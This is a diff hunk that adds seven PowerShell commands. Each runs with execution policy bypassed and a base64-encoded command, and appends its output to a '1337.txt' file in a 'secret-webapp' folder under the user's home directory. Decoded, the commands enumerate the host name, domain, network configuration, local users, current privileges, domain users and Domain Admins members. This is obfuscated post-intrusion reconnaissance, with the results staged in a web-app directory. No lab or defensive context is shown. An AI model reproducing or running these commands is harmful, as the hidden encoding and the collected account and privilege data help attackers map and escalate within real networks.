@@ -1,2 +1,7 @@
-
- | Out-File -FilePath "$home\secret-webapp\1337.txt" -Append
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand JABFAG4AdgA6AEMATwBNAFAAVQBUAEUAUgBOAEEATQBFAA== | Out-File -FilePath "$home\secret-webapp\1337.txt" -Append
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand JABFAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4A | Out-File -FilePath "$home\secret-webapp\1337.txt" -Append
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand RwBlAHQALQBOAGUAdABJAFAAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA= | Out-File -FilePath "$home\secret-webapp\1337.txt" -Append
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand RwBlAHQALQBMAG8AYwBhAGwAdQBzAGUAcgAgAHwAIABTAGUAbABlAGMAdAAgACoAIAB8ACAARgBvAHIAbQBhAHQALQBMAGkAcwB0ACAALQBQAHIAbwBwAGUAcgB0AHkAIAAqAA== | Out-File -FilePath "$home\secret-webapp\1337.txt" -Append
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand dwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYA | Out-File -FilePath "$home\secret-webapp\1337.txt" -Append
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand bgBlAHQAIAB1AHMAZQByACAALwBkAG8AbQBhAGkAbgA= | Out-File -FilePath "$home\secret-webapp\1337.txt" -Append
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand bgBlAHQAIABnAHIAbwB1AHAAIAAcIEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAHSAgAC8AZABvAG0AYQBpAG4A | Out-File -FilePath "$home\secret-webapp\1337.txt" -Append
